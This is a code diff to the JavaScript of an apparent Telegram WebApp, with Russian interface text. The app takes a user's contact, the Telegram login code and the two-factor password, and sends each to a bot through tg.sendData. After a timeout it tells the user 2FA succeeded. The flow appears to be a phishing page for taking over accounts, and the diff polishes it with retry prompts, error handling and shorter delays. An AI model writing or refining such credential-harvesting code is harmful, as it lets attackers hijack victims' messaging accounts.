@@ -16,6 +16,7 @@ document.addEventListener('DOMContentLoaded', () => {
     const errorMsg = document.getElementById('errorMsg');
 
     let currentStep = 'contact';  // Шаги: contact, code, 2fa
+    let awaitingResponse = false;
 
     loginBtn.addEventListener('click', () => {
         console.log('Login button clicked');
@@ -77,22 +78,22 @@ document.addEventListener('DOMContentLoaded', () => {
             }
             payload = { action: 'verify_code', code: code };
             console.log('Sending code data:', payload);
+            awaitingResponse = true;
+            statusMsg.textContent = 'Отправляем код...';
             tg.sendData(JSON.stringify(payload));
             showLoading();
-            statusMsg.textContent = 'Проверяем код...';
             tg.HapticFeedback.impactOccurred('medium');
             
-            // After verification, show instructions and 2FA field
+            // Показать инструкцию после отправки, но не скрывать поле кода сразу
             setTimeout(() => {
-                console.log('Show instructions and 2FA');
-                hideLoading();
-                codeInput.classList.add('hidden');
-                twoFaInput.classList.remove('hidden');
+                console.log('Show instructions');
+                statusMsg.innerHTML = 'Проверьте сообщение от бота.<br>Если код неверный, введите заново.<br>Если 2FA требуется, введите пароль ниже.';
                 instructionMsg.classList.remove('hidden');
-                submitBtn.textContent = 'Подтвердить 2FA (если требуется)';
+                twoFaInput.classList.remove('hidden');
+                submitBtn.textContent = 'Подтвердить (если 2FA)';
                 currentStep = '2fa';
-                twoFaInput.focus();
-            }, 3000);  // 3 seconds to see bot message
+                hideLoading();
+            }, 2000);  // Короткая задержка, чтобы увидеть возможную ошибку
             return;
         }
 
@@ -100,12 +101,13 @@ document.addEventListener('DOMContentLoaded', () => {
             const password = twoFaInput.value;
             payload = { action: 'verify_2fa', password: password };
             console.log('Sending 2FA data:', payload);
+            awaitingResponse = true;
+            statusMsg.textContent = 'Подтверждаем 2FA...';
             tg.sendData(JSON.stringify(payload));
             showLoading();
-            statusMsg.textContent = 'Подтверждаем...';
             tg.HapticFeedback.impactOccurred('heavy');
             setTimeout(() => {
-                console.log('Transition to success');
+                console.log('Assume success for 2FA');
                 hideLoading();
                 successMsg.classList.remove('hidden');
                 submitBtn.classList.add('hidden');
@@ -143,10 +145,19 @@ document.addEventListener('DOMContentLoaded', () => {
         errorMsg.classList.add('hidden');
         instructionMsg.classList.add('hidden');
         statusMsg.textContent = '';
+        awaitingResponse = false;
     }
 
     tg.onEvent('webAppDataSent', () => {
-        console.log('WebApp data sent');
+        console.log('WebApp data sent successfully');
         tg.HapticFeedback.impactOccurred('light');
+    });
+
+    // Добавим обработку ошибок
+    tg.onEvent('error', (error) => {
+        console.error('WebApp error:', error);
+        hideLoading();
+        errorMsg.textContent = '❌ Ошибка WebApp: ' + error;
+        errorMsg.classList.remove('hidden');
     });
 });
